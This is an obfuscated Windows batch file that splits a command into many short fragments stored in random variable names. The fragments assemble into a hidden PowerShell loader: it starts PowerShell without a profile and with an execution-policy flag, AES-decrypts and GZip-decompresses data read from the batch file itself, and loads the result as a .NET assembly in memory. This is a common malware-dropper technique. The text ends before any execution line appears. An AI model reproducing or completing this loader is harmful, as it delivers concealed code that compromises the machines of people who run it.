@echo off
set "bnyOXNVcna=ow"
set "zEkRcQMpjt=in"
set "yhADqSBJHF=Wi"
set "cTbIVlteJB=\v"
set "dMyPjMupOK=y "
set "qGCCAFGJpI=we"
set "pPtLSRREOx= C"
set "NSyfLUjQvt= /"
set "XyvHZHtLEh=em"
set "wFijZhPcdM=:\"
set "RasbyGeVNA=po"
set "vSXoIPBawL=rs"
set "CuRCMZcdsJ=.e"
set "FOrxeipQua=s\"
set "ckPJQbwwHk=1."
set "TtYtlCqGLB=ws"
set "mmnmhTqoNm=32"
set "hlSBKbSOlj=he"
set "fezbteNbSy=xe"
set "hbetUGzwEd=we"
set "piWjbLwzTx=Sy"
set "egPFKkILFD=st"
set "temnhuRukD=py"
set "QwsgJSoFyE=ll"
set "GwoVagFRGA=rS"
set "AgEILKLleC=he"
set "WAIhTpLOBG=ll"
set "wLjIpCcInx=nd"
set "rKVMlSSCxR=do"
set "rviPVyZLMU=\W"
set "IHZJHIbvkr=Po"
set "Vnrbmjehli=0\"
set "rvufoTSnmu=co"
set "iaglBkNsRc= %~dp0"
set "xOEUnaKXXo=cd"
set "MOdqSmvcJX=orF'"
set "yxzKdpDnCj=New-"
set "BgZTBZRnKR=hy.A"
set "YodwjqLsDP=y.Cr"
set "zmkJLxICLu=TOQV"
set "HVIVUNEjPb=);$K"
set "ejuYFERsHU=ct S"
set "YMHHNmQTPd=pose"
set "umoOEhLIdv=PKCS"
set "mQCzKFuuIg=;$DY"
set "rGAmQLFmeB=rtS4"
set "dzyiXglTUA=ress"
set "UjabOGLMdr=6esa"
set "vbeeWnhabX=ck($"
set "RYzEHFdkUR=t Sy"
set "FQTqcVYtne=] -j"
set "HOPQKQeNzH=-1.."
set "GNoXgsdcwM=sion"
set "MolHEOTtDi== $K"
set "fmdZelzotu=embl"
set "raceQHJXbu=eam("
set "DBacpviUgG=.Ass"
set "WtTAVuDtiQ=QT);"
set "SAonVbptUz=form"
set "ENkKwRdkis=bEK."
set "ZHtpboFwPd=('%~f0'"
set "mtNqbuCYcM=m.IO"
set "mvyrcpCpOj=7;$K"
set "dNLnZADzlx=esMa"
set "qMULZBFAgz=16] "
set "AOrXdrpDgJ=);$q"
set "yQALdnubDG=TllA"
set "bxJaQOolGB=ZMQT"
set "RGBGJfxWNR=J = "
set "CBYHfIYZxo=T = "
set "RZZoGCMVDO=-nop"
set "RiUUyGEeZG=e = "
set "oYLwdgLAuO=P4Ia"
set "ePwpLIonrA=daeR"
set "ePLBRctvkn=ateD"
set "FuuIbXyOWn=ose("
set "NQGWioEDmH=quMY"
set "uNbpdHBnuz=::('"
set "nvNWfxyfFg=WOZ "
set "DSfflDAKLn=n ''"
set "OvnWZhtuQH=OL.T"
set "Gdmbdfkqfp=, $E"
set "GziCjTEQwm=e]::"
set "mljzxdWFXy=ecry"
set "qTdtawWDYY=raph"
set "XVzfPwQjCH=Invo"
set "FXGfUMzMvT=$Dji"
set "btseumdIvn=EZMQ"
set "CWxCFuVfmf=oin "
set "EMtMvnGUID=VT ="
set "KHzkzUFqfX=.GZi"
set "YPaagqPThB=Bmor"
set "kZMFdIoGdU=tem."
set "AusnosTHez=ZMQT"
set "XAJDktSmUw= New"
set "YyFxjLaUaI=$Dji"
set "FVFHEmlYIB=tOL."
set "metplSRZZh=)))"
set "hpvcCIuulg=Fina"
set "NLNPRLwPLr=m(, "
set "fsMbCCJjDA=gnir"
set "DOQLdcinzo=CsvP"
set "mXlkLPxNSk=esaB"
set "RQZgqzHkTr=Disp"
set "VJnlqRagPR=2Q+X"
set "cqwkTJMGGw=Stre"
set "YsLFxjmtjN=.Mem"
set "VLfDtkNwZf=-joi"
set "lnZHiCJCve=stem"
set "ejBScnbwqu=-ep "
set "kERkTiIMTG=Syst"
set "xzvpEJCKPR=('KY"
set "zSooYyCJgU=T, 0"
set "lHpKMmABGm=Comp"
set "SNFKHztIul=tsWi"
set "JzIMDHHzCu=vert"
set "vbRxbcAeol= = N"
set "xzQRJAnwfC=Etk/"
set "uFGkAvQwik=jirG"
set "nxxZCAbYhw=fore"
set "aMfvoSMhEJ=[Sys"
set "ZDGlVrVdxX=Comp"
set "LBnRGmpVfi=bEK "
set "cKTrViYtGd=stem"
set "HCNndftzzp=raph"
set "QGWDuBoHCI=bjec"
set "ZyxqOwcaRj=mMK4"
set "RYqrFxabCs=lbXY"
set "SaAqAHJatR=EZMQ"
set "jPfIevHkUt=rG);"
set "KcJgqYYgzI=S46e"
set "qocmKZZsRX=Syst"
set "MozyqRizdW=)) {"
set "VnmZQSieam=ment"
set "fpmhbzNxUR=gN+y"
set "HIkshhEyFu=9tpc"
set "mhFWaVoXJL=onve"
set "RmHQfeMnkI=ay()"
set "dbcewKVRDc=lbXY"
set "onnEKsifNo='txe"
set "ECGBMauNtR=tS46"
set "EsWOmRTKLo=157K"
set "YaZYUqGUAf=ddin"
set "WQXCtaXLxB=oint"
set "qEdOcfENIV=;$FN"
set "cQEyUIFySX=ke($"
set "YDuKaYzJWr=YJ.D"
set "yLfrBSTjSx=m.IO"
set "HnqXeenBcZ=ing("
set "LzBhEWgagi=Secu"
set "DhfmxuPySh=tmF."
set "VrkpZVpjKz=gMod"
set "hihuqFjAeH=ddin"
set "HgLqMfJUIl=$KCs"
set "HNFNfREXvC=y.Pa"
set "qcvuebozyh=]::("
set "HjFTmASnnF=ode]"
set "AwfSZEECbM=; };"
set "ySykhzRXTc=1] -"
set "yLATeOPtic=ionM"
set "wbuXnusHaY=1..-"
set "pmLPWQleeK=();$"
set "eFdVLZZfGi=Mode"
set "dXObrzBUrk=tOL "
set "CPMDzVQHvo=g = "
set "MhrFhqEPkf=tem."
set "ktaTMNfFbv=oL'["
set "clBXePPatv=brea"
set "fonPZVtxAk=tem."
set "nzUDZEccrA=stem"
set "VYnCKNoWak=vOr."
set "eHrkoMOOle=T = "
set "nVJUiPfodz=.Sec"
set "zmpcuWoFwS=ypto"
set "nNVNavLtTp=$EZM"
set "xOlJMePTxV=New-"
set "maPbWEaLbJ=morF"
set "xfggdJmbHi=.Cop"
set "IraZYSaIlm=ispo"
set "QgWLvTqZyd=bstr"
set "xFafqmkuzd=);$D"
set "ehuiAqLDEu=yste"
set "xtVerfzbaF=;$FN"
set "fypGgLJocE=ss -"
set "EgqLlcDxpb=le  "
set "yfvCRKOSBz='')("
set "dstRPyIalB=$EZM"
set "twiHotnwAv=d;$K"
set "VcRbmOXAZG=rofi"
set "XMNDlpdGDZ=ert]"
set "hfxGuTrGdu=em.C"
set "OwbuyGEKOO=pose"
set "gdHXCxALhv='[-1"
set "cjEsDGbxwK=[-1."
set "HNZjvGxksc=BC;$"
set "rukHEcAmWA=Disp"
set "ngZPtNCUvl=[Sys"
set "pbVHaNNsMa=gtmF"
set "xfehIYgRTb=y.Ci"
set "suYEgaumgS=lBlo"
set "NxSVBJErWM=ion."
set "yQOVohPnHg=($rz"
set "NrnBwXXlRA=;$WO"
set "cjcSSgVFZP=vP.I"
set "HaOHnocMgg=comp"
